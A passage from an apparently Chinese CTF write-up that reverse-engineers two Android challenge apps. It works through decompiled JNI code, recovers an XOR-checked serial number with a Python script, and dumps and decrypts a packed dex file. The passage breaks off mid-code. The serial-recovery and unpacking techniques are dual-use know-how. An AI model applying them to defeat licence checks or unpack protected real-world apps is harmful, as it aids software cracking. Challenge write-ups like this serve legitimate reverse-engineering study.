Native 层实现。其中 onCreate 中调用了 initSN 函数。SN 猜测是 Serial Number 即序列号：</p><pre><code class="java">package com.gdufs.xman;import android.app.Application;import android.util.Log;public class MyApp extends Application {    public static int m = 0;    public native void initSN();    public native void saveSN(String str);    public native void work();    static {        System.loadLibrary(&quot;myjni&quot;);    }    public void onCreate() {        initSN();        Log.d(&quot;com.gdufs.xman m=&quot;, String.valueOf(m));        super.onCreate();    }}</code></pre><p>RegActivity 中获取输入的字符串，并作为 SN 传入 saveSN 函数。然后 App 将会把自己的进程杀死：</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.DialogInterface;import android.os.Bundle;import android.os.Process;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class RegActivity extends Activity {    private Button btn_reg;    private EditText edit_sn;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_reg);        this.btn_reg = (Button) findViewById(R.id.button1);        this.edit_sn = (EditText) findViewById(R.id.editText1);        this.btn_reg.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                String sn = RegActivity.this.edit_sn.getText().toString().trim();                if (sn == null || sn.length() == 0) {                    Toast.makeText(RegActivity.this, &quot;\u60a8\u7684\u8f93\u5165\u4e3a\u7a7a&quot;, 0).show(); // 您的输入为空                    return;                }                ((MyApp) RegActivity.this.getApplication()).saveSN(sn);                new Builder(RegActivity.this).setTitle(&quot;\u56de\u590d&quot;).setMessage(&quot;\u60a8\u7684\u6ce8\u518c\u7801\u5df2\u4fdd\u5b58&quot;).setPositiveButton(&quot;\u597d\u5427&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 回复 | Message =&gt; 您的注册码已保存 | PositiveButton =&gt; 好吧                    public void onClick(DialogInterface dialog, int which) {                        Process.killProcess(Process.myPid());                    }                }).show();            }        });    }}</code></pre><p>那么基本上就是求出正确的 SN 了。在 Native 查看，发现函数在 JNI_OnLoad 中动态注册：</p><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *a1){  if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;g_env, 65542) )    return -1;  _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;JNI_OnLoad()&quot;);  native_class = (int)g_env-&gt;functions-&gt;FindClass(&amp;g_env-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  if ( !g_env-&gt;functions-&gt;RegisterNatives(&amp;g_env-&gt;functions, (jclass)native_class, (const JNINativeMethod *)gMethods, 3) )// register 3 methods  {    _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() ok&quot;);    return 65542;  }  _android_log_print(6, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() failed&quot;);  return -1;}</code></pre><p>先来看 initSN，其中读取 <code>/sdcard/reg.dat</code> 中的内容并和 <code>EoPAoY62@ElRD</code> 进行比较：</p><pre><code class="cpp">void __fastcall initSN(_JNIEnv *a1){  _JNIEnv *env; // r6  FILE *f; // r0  FILE *f_1; // r4  _JNIEnv *env_1; // r0  int v5; // r1  int len; // r7  char *data; // r5  _JNIEnv *env_2; // r0  int v9; // r1  env = a1;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;r+&quot;);  f_1 = f;  if ( !f )                                     // read file error  {    env_1 = env;    v5 = (int)f_1;LABEL_5:    setValue(env_1, v5);    return;  }  fseek(f, 0, 2);                               // seek to file end ( SEEK_END )  len = ftell(f_1);  data = (char *)malloc(len + 1);               // malloc error  if ( !data )  {    fclose(f_1);    env_1 = env;    v5 = 0;    goto LABEL_5;  }  fseek(f_1, 0, 0);                             // seek to file start ( SEEK_SET )  fread(data, len, 1u, f_1);  data[len] = 0;  if ( !strcmp(data, &quot;EoPAoY62@ElRD&quot;) )  {    env_2 = env;    v9 = 1;  }  else  {    env_2 = env;    v9 = 0;  }  setValue(env_2, v9);  j_fclose(f_1);}</code></pre><p>其中看到有一个 setValue 函数，将 m 的值设为指定的值：</p><pre><code class="cpp">void __fastcall setValue(_JNIEnv *a1, int val){  int val_1; // r7  _JNIEnv *v3; // r4  jclass v4; // r0  void *v5; // r5  struct _jfieldID *v6; // r0  val_1 = val;  v3 = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v5 = v4;  v6 = v3-&gt;functions-&gt;GetStaticFieldID(&amp;v3-&gt;functions, v4, &quot;m&quot;, &quot;I&quot;);  v3-&gt;functions-&gt;SetStaticIntField(&amp;v3-&gt;functions, v5, v6, val_1);// set m = val}</code></pre><p>接下来看 saveSN，这里做一个循环，将 reg.dat 中的字符串取出来并和 key 进行异或：</p><pre><code class="cpp">int __fastcall saveSN(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *env; // r6  jstring str; // r9  FILE *v5; // r7  int *v7; // r4  const char *v8; // r3  int v9; // r0  int v10; // r1  _WORD *v11; // r5  JNIEnv *v12; // r0  int i; // r4  const struct JNINativeInterface *v14; // r3  signed int j; // r6  const char *utf_string; // r9  const char *data; // r5  signed int len; // r10  char val; // r2  char tmp; // r3  int v21; // [sp+0h] [bp-38h]  int v22; // [sp+14h] [bp-24h]  char v23; // [sp+18h] [bp-20h]  env = a1;  str = a3;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;w+&quot;);  if ( f )  {    v7 = &amp;v21;    v8 = &quot;W3_arE_whO_we_ARE&quot;;    do    {      v9 = *(_DWORD *)v8;      v8 += 8;      v10 = *((_DWORD *)v8 - 1);      *v7 = v9;      v7[1] = v10;      v11 = v7 + 2;      v7 += 2;    }    while ( v8 != &quot;E&quot; );    v12 = &amp;env-&gt;functions;    i = 2016;    *v11 = *(_WORD *)v8;    v14 = env-&gt;functions;    j = 0;    utf_string = v14-&gt;GetStringUTFChars(v12, str, 0);    data = utf_string;    len = strlen(utf_string);    while ( j &lt; len )    {      if ( j % 3 == 1 )      {        i = (i + 5) % 16;        val = *(&amp;v23 + i - 23);                 // &amp;v23 - 32 = &amp;&quot;3_arE_whO_we_ARE&quot;      }      else if ( j % 3 == 2 )      {        i = (i + 7) % 15;        val = *(&amp;v23 + i - 22);                 // &amp;v23 - 22 = &amp;&quot;_arE_whO_we_ARE&quot;      }      else      {        i = (i + 3) % 13;        val = *(&amp;v23 + i - 21);                 // &amp;v23 - 21 = &amp;&quot;arE_whO_we_ARE&quot;      }      tmp = *data;      ++j;      *((_BYTE *)++data - 1) = tmp ^ val;    }    fputs(utf_string, f);  }  else if ( v22 == _stack_chk_guard )  {    return j___android_log_print(3, &quot;com.gdufs.xman&quot;, &amp;unk_2DCA);  }  return j_fclose(f);}</code></pre><p>work 函数中初始化了 SN，获取了 m 的值，并最后调用 callWork：</p><pre><code class="cpp">void __fastcall work(_JNIEnv *a1){  _JNIEnv *env; // r4  jint m; // r0  _JNIEnv *env_1; // r0  void *v4; // r1  bool v5; // zf  env = a1;  initSN(a1);  m = getValue(env);  if ( m )  {    v5 = m == 1;    env_1 = env;    if ( v5 )      v4 = &amp;unk_2E6B;                           // [0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x8D, 0xB3, 0xE6, 0x98, 0xAF, 0x66, 0x6C, 0x61, 0x67, 0x2C, 0xE6, 0xA0, 0xBC, 0xE5, 0xBC, 0x8F, 0xE4, 0xB8, 0xBA, 0x78, 0x6D, 0x61, 0x6E, 0x7B, 0xE2, 0x80, 0xA6, 0xE2, 0x80, 0xA6, 0x7D, 0xEF, 0xBC, 0x81]    else      v4 = &amp;unk_2E95;                           // [0xE7, 0x8A, 0xB6, 0xE6, 0x80, 0x81, 0xE4, 0xB8, 0x8D, 0xE5, 0xA4, 0xAA, 0xE5, 0xAF, 0xB9, 0xE3, 0x80, 0x82, 0xE3, 0x80, 0x82]  }  else  {    env_1 = env;    v4 = &amp;unk_2E5B;                             // [0xE8, 0xBF, 0x98, 0xE4, 0xB8, 0x8D, 0xE8, 0xA1, 0x8C, 0xE5, 0x91, 0xA2, 0xEF, 0xBC, 0x81]  }  callWork(env_1, (int)v4);}</code></pre><p>其中 getValue 就是获取 m 的值：</p><pre><code class="cpp">jint __fastcall getValue(_JNIEnv *a1){  _JNIEnv *v1; // r4  jclass v2; // r0  void *v3; // r5  struct _jfieldID *v4; // r0  v1 = a1;  v2 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v3 = v2;  v4 = v1-&gt;functions-&gt;GetStaticFieldID(&amp;v1-&gt;functions, v2, &quot;m&quot;, &quot;I&quot;);  return v1-&gt;functions-&gt;GetStaticIntField(&amp;v1-&gt;functions, v3, v4);// get m&#39;s value}</code></pre><p>callWork 中就是调用了 work 函数，这样看来是个死循环：</p><pre><code class="cpp">void __fastcall callWork(_JNIEnv *a1, void *a2){  const char *v2; // r8  _JNIEnv *env; // r4  jclass v4; // r0  void *v5; // r5  struct _jmethodID *v6; // r0  jobject v7; // r7  struct _jmethodID *v8; // r5  void (*v9)(JNIEnv *, jobject, jmethodID, ...); // r6  jstring v10; // r0  v2 = (const char *)a2;  env = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MainActivity&quot;);  v5 = v4;  v6 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v4, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);  v7 = env-&gt;functions-&gt;NewObject(&amp;env-&gt;functions, v5, v6);  v8 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v5, &quot;work&quot;, &quot;(Ljava/lang/String;)V&quot;);  if ( v8 )  {    v9 = env-&gt;functions-&gt;CallVoidMethod;    v10 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, v2);    v9(&amp;env-&gt;functions, v7, v8, v10);  }}</code></pre><p>在 saveSN 中其实就是实际的算法，逆一下实现解 SN 脚本：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;EoPAoY62@ElRD&#39;key = &#39;W3_arE_whO_we_ARE&#39;i = 2016j = 0l = len(ciphertext)result = &#39;&#39;while j &lt; l:    if j % 3 == 1:        i = (i + 5) % 16        val = ord(key[i + 1])    elif j % 3 ==2:        i = (i + 7) % 15        val = ord(key[i + 2])    else:        i = (i + 3) % 13        val = ord(key[i + 3])    result += chr(ord(ciphertext[j]) ^ val)    j += 1print result</code></pre><h1 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h1><p>首先查看 AndroidManifest.xml，发现启动 Activity 为 <code>android.app.NativeActivity</code>，是在 Native 层实现的安卓 Activity：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.a.sample.findmydex&quot; platformBuildVersionCode=&quot;24&quot; platformBuildVersionName=&quot;7.0&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;  &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;24&quot; /&gt;  &lt;application android:allowBackup=&quot;false&quot; android:fullBackupContent=&quot;false&quot; android:hasCode=&quot;false&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;    &lt;activity android:configChanges=&quot;0xa0&quot; android:label=&quot;@string/app_name&quot; android:name=&quot;android.app.NativeActivity&quot;&gt;      &lt;meta-data android:name=&quot;android.app.lib_name&quot; android:value=&quot;native&quot; /&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;    &lt;activity android:name=&quot;com.a.sample.findmydex.MainActivity&quot;&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;com.a.sample.findmydex.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;  &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>看了一下 Java 只有一个类：</p><pre><code class="java">class Placeholder {    Placeholder() {        super();    }}</code></pre><p>先查看 NativeActivity 中的 onCreate 函数，其中在 pthread_create 里的第三个参数是对应的 MainActivity 的入口点，即 android_app_entry：</p><pre><code class="cpp">int __fastcall ANativeActivity_onCreate(_DWORD *a1, int a2, size_t a3){  _DWORD *v3; // r8  int savedState; // r10  size_t savedStateSize; // r9  int activity; // r0  __int64 v7; // r2  char *v8; // r5  void *v9; // r0  int *v10; // r0  char *v11; // r0  pthread_attr_t attr; // [sp+4h] [bp-30h]  v3 = a1;  savedState = a2;  savedStateSize = a3;  activity = *a1;  *(_DWORD *)(activity + 20) = sub_3000;  *(_DWORD *)activity = sub_305A;  *(_DWORD *)(activity + 4) = sub_3062;  *(_DWORD *)(activity + 8) = sub_306A;  *(_DWORD *)(activity + 12) = sub_30BE;  HIDWORD(v7) = sub_30EE;  *(_DWORD *)(activity + 16) = sub_30C6;  LODWORD(v7) = sub_30DE;  *(_DWORD *)(activity + 56) = sub_30CE;  *(_DWORD *)(activity + 60) = sub_30D6;  *(_QWORD *)(activity + 24) = v7;  *(_DWORD *)(activity + 40) = sub_30F4;  *(_DWORD *)(activity + 44) = sub_30FC;  *(_DWORD *)(activity + 48) = sub_3102;  v8 = (char *)malloc(0x94u);  _aeabi_memclr4();  *((_DWORD *)v8 + 3) = v3;  pthread_mutex_init((pthread_mutex_t *)(v8 + 64), 0);  pthread_cond_init((pthread_cond_t *)(v8 + 68), 0);  if ( savedState )  {    v9 = malloc(savedStateSize);    *((_DWORD *)v8 + 5) = v9;    *((_DWORD *)v8 + 6) = savedStateSize;    _aeabi_memcpy(v9, savedState, savedStateSize);  }  if ( pipe(&amp;attr.__align + 6) )  {    v10 = (int *)_errno();    v11 = strerror(*v10);    _android_log_print(6, &quot;threaded_app&quot;, &quot;could not create pipe: %s&quot;, v11);    v8 = 0;  }  else  {    *((_QWORD *)v8 + 9) = *((_QWORD *)&amp;attr.__align + 3);    pthread_attr_init(&amp;attr);    pthread_attr_setdetachstate(&amp;attr, 1);    pthread_create((pthread_t *)v8 + 20, &amp;attr, (void *(*)(void *))android_app_entry, v8);    pthread_mutex_lock((pthread_mutex_t *)(v8 + 64));    while ( !*((_DWORD *)v8 + 27) )      pthread_cond_wait((pthread_cond_t *)(v8 + 68), (pthread_mutex_t *)(v8 + 64));    pthread_mutex_unlock((pthread_mutex_t *)(v8 + 64));  }  v3[7] = v8;  return _stack_chk_guard - *(&amp;attr.__align + 8);}</code></pre><p>在 android_app_entry 中，在 android_app_destroy 上面可以找到对应的 MainActivity 函数：</p><pre><code class="cpp">int __fastcall android_app_entry(int a1){  int v1; // r4  int v2; // r1  int v3; // r5  int result; // r0  char v5; // [sp+8h] [bp-14h]  char v6; // [sp+Ah] [bp-12h]  int v7; // [sp+Ch] [bp-10h]  v1 = a1;  *(_DWORD *)(a1 + 16) = AConfiguration_new();  v2 = *(_DWORD *)(*(_DWORD *)(v1 + 12) + 32);  AConfiguration_fromAssetManager();  AConfiguration_getLanguage(*(_DWORD *)(v1 + 16), &amp;v6);  AConfiguration_getCountry(*(_DWORD *)(v1 + 16), &amp;v5);  *(_DWORD *)(v1 + 84) = 1;  *(_DWORD *)(v1 + 88) = v1;  *(_DWORD *)(v1 + 92) = sub_3344;  *(_DWORD *)(v1 + 96) = 2;  *(_DWORD *)(v1 + 100) = v1;  *(_DWORD *)(v1 + 104) = sub_3370;  v3 = ALooper_prepare(1);  ALooper_addFd(v3, *(_DWORD *)(v1 + 72), 1, 1, 0, v1 + 84);  *(_DWORD *)(v1 + 28) = v3;  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  *(_DWORD *)(v1 + 108) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  j_android_main(v1);  android_app_destroy(v1);  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  if ( *(_DWORD *)(v1 + 32) )    AInputQueue_detachLooper();  AConfiguration_delete(*(_DWORD *)(v1 + 16));  *(_DWORD *)(v1 + 116) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  result = _stack_chk_guard - v7;  if ( _stack_chk_guard == v7 )    result = 0;  return result;}</code></pre><p>进入 MainActivity 之后，一开始有一段异或的数据：</p><pre><code class="cpp">  *(_DWORD *)filename = 0x9D888DC6;  *(_DWORD *)&amp;filename[4] = 0x888DC688;  *(_DWORD *)&amp;filename[8] = 0x8AC6889D;  *(_DWORD *)&amp;filename[12] = 0x88C78486;  *(_DWORD *)&amp;filename[16] = 0x84889AC7;  *(_DWORD *)&amp;filename[20] = 0xC78C8599;  *(_DWORD *)&amp;filename[24] = 0x8D87808F;  *(_DWORD *)&amp;filename[28] = 0x8C8D9084;  *(_DWORD *)&amp;filename[32] = 0x808FC691;  *(_DWORD *)&amp;filename[36] = 0xC69A8C85;  *(_DWORD *)&amp;filename[40] = 0x9A88858A;  *(_DWORD *)&amp;filename[44] = 0xC79A8C9A;  *(_DWORD *)&amp;filename[48] = 0xE9918C8D;  filename[52] = 0;  *(_DWORD *)name = 0x9D888DC6;  *(_DWORD *)&amp;name[4] = 0x888DC688;  *(_DWORD *)&amp;name[8] = 0x8AC6889D;  *(_DWORD *)&amp;name[12] = 0x88C78486;  *(_DWORD *)&amp;name[16] = 0x84889AC7;  *(_DWORD *)&amp;name[20] = 0xC78C8599;  *(_DWORD *)&amp;name[24] = 0x8D87808F;  *(_DWORD *)&amp;name[28] = 0x8C8D9084;  *(_DWORD *)&amp;name[32] = 0x808FC691;  *(_DWORD *)&amp;name[36] = 0xC69A8C85;  *(_DWORD *)&amp;name[40] = 0x918C8D86;  name[46] = 0;  i = 1;  *(_WORD *)&amp;name[44] = 0xE9C6u;  filename[0] = 47;  do  {    filename[i] ^= 0xE9u;                       // filename = &#39;/data/data/com.a.sample.findmydex/files/classes.dex&#39;    ++i;  }  while ( i != 53 );  j = 1;  name[0] = 47;  do  {    name[j] ^= 0xE9u;                           // name = &#39;/data/data/com.a.sample.findmydex/files/odex/&#39;    ++j;  }  while ( j != 47 );</code></pre><p>解密一下，可以发现是生成目标 dex 文件和 odex 的路径：</p><pre><code class="python">#!/usr/bin/env pythondef word2bytes(w):    return [w &amp; 0xFF, (w &gt;&gt; 8) &amp; 0xFF, (w &gt;&gt; 16) &amp; 0xFF, w &gt;&gt; 24]def bytes2word(bs):    return bs[0] | bs[1] &lt;&lt; 8 | bs[2] &lt;&lt; 16 | bs[3] &lt;&lt; 24def words2byte(ws):    result = []    for w in ws:        temp = word2bytes(w)        for b in temp:            result.append(b)    return resultdef bytes2words(bs):    result = []    for i in range(len(bs) / 4):        temp = bytes2word(bs[4*i:4*i+4])        result.append(temp)    return resultfilename = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x9A88858A, 0xC79A8C9A, 0xE9918C8D]name = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x918C8D86, 0x0000E9C6]filename = words2byte(filename)name = words2byte(name)filename = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), filename[1:])))name = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), name[1:])))print filename# /data/data/com.a.sample.findmydex/files/classes.dexprint name# /data/data/com.a.sample.findmydex/files/odex/</code></pre><p>然后接下来，可以看到一些涉及到 OpenGL 库的函数：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);  v10 = 0;  do  {    while ( 1 )    {      v12 = 0;      if ( !v30 )        v12 = -1;      v13 = ALooper_pollAll(v12, 0, &amp;v25, &amp;v24);// get time      if ( v13 &gt;= 0 )        break;      if ( v30 )      {        v11 = v31 + 0.01;        if ( (float)(v31 + 0.01) &gt; 1.0 )          v11 = 0.0;        v31 = v11;        sub_2C14((int)&amp;v26);                    // OpenGL      }    }...int __fastcall sub_2C14(int a1){  int v1; // r4  int result; // r0  v1 = a1;  result = *(_DWORD *)(a1 + 20);  if ( !result )    return result;  glClearColor(    (float)*(signed int *)(v1 + 44) / (float)*(signed int *)(v1 + 32),// red    *(GLclampf *)(v1 + 40),                     // green    (float)*(signed int *)(v1 + 48) / (float)*(signed int *)(v1 + 36),// blue    1.0);  glClear(0x4000u);  result = j_eglSwapBuffers(*(_QWORD *)(v1 + 20), *(_QWORD *)(v1 + 20) &gt;&gt; 32);  return result;}</code></pre><p>这部分不去仔细看，可以直接根据 log 来判断程序的流程，可以判断出是要求在 10 秒内摇 100 次手机。在 <code>(times - 1) &lt;= 88</code> 处可以看到开始对数据进行解压缩处理。在后面 <code>times == 100</code>，可以判断是达到了 100 次后，开始对将数据输出到文件中：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);...            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Oh yeah~ You Got it~ %d times to go~&quot;, 99 - v10);...        if ( (unsigned int)(times - 1) &lt;= 88 )        {          v10 = times;          v15 = times / 10;          if ( times % 10 == 9 )          {            v16 = size_1;            v17 = (signed int)size_1 / 10;            v18 = (v15 + 1) * ((signed int)size_1 / 10);            if ( (signed int)size_1 / 10 * v15 &lt; v18 )            {              v19 = &amp;data[v17 * v15];              do              {                --v17;                *v19++ ^= times;              }              while ( v17 );            }            if ( times == 89 )            {              while ( v18 &lt; (signed int)v16 )                data[v18++] ^= 0x59u;            }            v10 = times + 1;          }        }        if ( times == 100 )                     // reach the target        {          if ( (signed int)(time(0) - v6) &gt; 9 )          {            _android_log_print(4, &quot;FindMyDex&quot;, &quot;OH~ You are too slow. Please try again&quot;);            _aeabi_memcpy(data, &amp;data_1, size_1);            v10 = 0;          }          else          {            v20 = v6;            if ( uncompress(dest, &amp;destLen, data, (uLong)size_1) )// uncompress data              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Dangerous operation detected.&quot;);            v21 = open(filename, 577, 511);            if ( !v21 )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission.&quot;);            write(v21, dest, destLen);            close(v21);            free(dest);            free(data);            if ( access(name, 0) &amp;&amp; mkdir(name, 0x1FFu) )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission..&quot;);            sub_2368((int)v1);            remove(filename);            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Congratulations!! You made it!&quot;);            sub_2250(v1);            v10 = 0x80000000;            v6 = v20;          }        }      }    }...</code></pre><p>用 IDC 脚本把数据 dump 下来：</p><pre><code class="cpp">static main() {    auto fp, start, end, len, b;    fp = fopen(&quot;dump.data&quot;, &quot;wb&quot;);    start = 0x7004;    len = 0x3CA10;    end = start + len;    for (b = start; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><p>然后实现一下对 dex 文件的解压缩过程：</p><pre><code class="python">#!/usr/bin/env pythonimport zlibwith open(&#39;dump.data&#39;, &#39;rb&#39;) as f:    data = f.read()data = [ord(c) for c in data]size = 0x3CA10for times in range(90):    v15 = times / 10    if times % 10 == 9:        v16 = size        v17 = size / 10        v18 = (v15 + 1) * (size / 10)        if size / 10 * v15 &lt; v18:            for i in range(v17):                data[v17 * v15 + i] ^= times        if times == 89:            while v18 - v16 &lt; 0:                data[v18] ^= 0x59                v18 += 1data = &#39;&#39;.join([chr(c) for c in data])data = zlib.decompress(data)with open(&#39;dump.dex&#39;, &#39;wb&#39;) as f:    for c in data:        f.write(c)</code></pre><p>接下来用 JEB 对 dex 文件进行分析。首先在 MainActivity 中，变量 m 是密文，onCreate 中调用了 a 类。函数 b 则是一个加密函数，其中涉及到了 b 类中函数：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.os.Bundle;import android.support.v7.a.u;import java.io.BufferedInputStream;import java.io.ByteArrayInputStream;import java.nio.ByteBuffer;import java.util.ArrayList;public class MainActivity extends u {    private static byte[] m;    static {        MainActivity.m = new byte[]{-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 0x1F, 24, -91, -112, -83, 0x40, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 0x75, 29, -44, 6, 0x70, -4, 81, 84, 9, 22, -51, 0x5F, -34, 12, 0x2F, 77};    }    public MainActivity() {        super();    }    static byte[] a(String arg1, String arg2) {        return MainActivity.b(arg1, arg2);    }    private static byte[] b(String arg7, String arg8) {        byte[] v0_1;        try {            BufferedInputStream v2 = new BufferedInputStream(new ByteArrayInputStream(arg7.getBytes()));            byte[] v1 = new byte[16];            ArrayList v3 = new ArrayList();            Object v4 = b.a(arg8.getBytes()); // 处理密钥            while(v2.read(v1, 0, 16) != -1) { // 循环加密，采用ECB模式                v3.add(b.a(v1, 0, v4));                v1 = new byte[16];            }            ByteBuffer v2_1 = ByteBuffer.allocate(v3.size() * 16); // 转换成字节数组            Object[] v3_1 = v3.toArray();            int v4_1 = v3_1.length;            int v1_1;            for(v1_1 = 0; v1_1 &lt; v4_1; ++v1_1) {                v2_1.put(v3_1[v1_1]);            }            v0_1 = v2_1.array();        }        catch(Exception v0) {            v0_1 = new byte[1];        }        return v0_1;    }    static byte[] i() { // Cipheretxt        return MainActivity.m;    }    protected void onCreate(Bundle arg4) {        super.onCreate(arg4);        this.setContentView(0x7F04001A); // activity_main        this.findViewById(0x7F0B0055).setOnClickListener(new a(this, this.findViewById(0x7F0B0054), ((Context)this))); // button | edit_text    }}</code></pre><p>类 a 中设置了一个监听按钮的事件，并将输入和指定的字符串作为参数传入 MainActivity 的函数 a。并与密文进行比较：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.view.View$OnClickListener;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.util.Arrays;class a implements View$OnClickListener {    a(MainActivity arg1, EditText arg2, Context arg3) {        this.c = arg1;        this.a = arg2;        this.b = arg3;        super();    }    public void onClick(View arg5) {        if(Arrays.equals(MainActivity.a(this.a.getText().toString(), this.c.getString(0x7F060023)), MainActivity.i())) { // I have a male fish and a female fish.            Toast.makeText(this.b, this.c.getString(0x7F060025), 1).show(); // Yes! You got me! :)        }        else {            Toast.makeText(this.b, this.c.getString(0x7F060022), 1).show(); // NO~ You don&#39;t get me~ T_T        }    }}</code></pre><p>b 类的 a 函数主要将数组的长度补齐成 8 的倍数，并调用 b 函数：</p><pre><code class="java">    public static Object a(byte[] arg5) { // 补齐块        Object v0_3;        int v1 = 0x20;        int v0 = 0;        Class v2 = b.class;        __monitor_enter(v2);        try {            if(arg5.length &gt; v1 || arg5.length % 8 != 0) { // 长度大于32或不是8的倍数                if(arg5.length &lt;= v1) {                    v1 = arg5.length;                }                if((v1 &amp; 7) &gt; 0) { // 判断数组长度是否是8的倍数，不是的话补齐                    v0 = 1;                }                byte[] v0_2 = new byte[v0 * 8 + v1];                System.arraycopy(arg5, 0, v0_2, 0, v1);                arg5 = v0_2;            }            v0_3 = b.b(arg5);        }        catch(Throwable v0_1) {            __monitor_exit(v2);            throw v0_1;        }        __monitor_exit(v2);        return v0_3;    }</code></pre><p>b 类中的 b 函数是一个处理密钥的函数：</p><pre><code class="java">    private static Object b(byte[] arg19) { // 处理密钥        Object[] v1_2;        int[] v13;        int v10_1;        int v9_1;        int v8_1;        int[] v11_1;        int v12;        int v3;        int v1_1;        int v5;        int v4;        Class v6 = b.class;        __monitor_enter(v6);        if(arg19 != null) {            goto label_10;        }        try {            throw new InvalidKeyException(&quot;Empty key&quot;);        label_10:            v4 = arg19.length;            if(v4 != 8 &amp;&amp; v4 != 16 &amp;&amp; v4 != 24 &amp;&amp; v4 != 0x20) {                throw new InvalidKeyException(&quot;Incorrect key length&quot;);            }            int v7 = v4 / 8;            v5 = 40;            int[] v8 = new int[4];            int[] v9 = new int[4];            int[] v10 = new int[4];            v1_1 = 0;            v3 = 0;            int v2;            for(v2 = v7 - 1; v3 &lt; 4; --v2) {                if(v1_1 &gt;= v4) {                    break;                }                int v11 = v1_1 + 1;                v12 = v11 + 1;                v1_1 = arg19[v1_1] &amp; 0xFF | (arg19[v11] &amp; 0xFF) &lt;&lt; 8;                v11 = v12 + 1;                v1_1 |= (arg19[v12] &amp; 0xFF) &lt;&lt; 16;                v12 = v11 + 1;                v8[v3] = v1_1 | (arg19[v11] &amp; 0xFF) &lt;&lt; 24;                v1_1 = v12 + 1;                v11 = arg19[v12] &amp; 0xFF;                v12 = v1_1 + 1;                v1_1 = (arg19[v1_1] &amp; 0xFF) &lt;&lt; 8 | v11;                v11 = v12 + 1;                v12 = (arg19[v12] &amp; 0xFF) &lt;&lt; 16 | v1_1;                v1_1 = v11 + 1;                v9[v3] = (arg19[v11] &amp; 0xFF) &lt;&lt; 24 | v12;                v10[v2] = b.a(v8[v3], v9[v3]);                ++v3;            }            v11_1 = new int[v5];            v1_1 = 0;            v2 = 0;            while(v2 &lt; 20) {                v3 = b.a(v7, v1_1, v8);                v4 = b.a(v7, 0x1010101 + v1_1, v9);                v4 = v4 &gt;&gt;&gt; 24 | v4 &lt;&lt; 8;                v3 += 